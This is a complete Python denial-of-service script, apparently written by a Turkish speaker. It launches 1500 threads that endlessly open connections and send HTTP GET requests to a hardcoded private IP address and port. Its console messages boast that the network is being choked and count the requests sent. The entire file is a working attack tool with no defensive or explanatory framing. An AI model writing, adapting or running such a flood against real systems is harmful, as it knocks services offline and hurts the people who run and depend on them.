import socket
import threading
import sys
import time

TARGET_IP = "172.20.10.14"
TARGET_PORT = 3000
THREAD_COUNT = 1500  
packet_count = 0
lock = threading.Lock()

http_request = f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".encode()

def http_attack():
    global packet_count
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(http_request)
            s.close()
            with lock:
                packet_count += 1
                if packet_count % 100 == 0:
                    sys.stdout.write(f"\r🔥 AĞ BOĞULUYOR: {packet_count} istek gönderildi!")
                    sys.stdout.flush()
        except:
            continue

print(f"🚀 {TARGET_IP} için canlı veri dondurma operasyonu başladı...")
print(f"👥 {THREAD_COUNT} saldırgan devrede.")

for i in range(THREAD_COUNT):
    t = threading.Thread(target=http_attack)
    t.daemon = True
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n🛑 Operasyon durduruldu. Toplam {packet_count} istek gönderildi.")
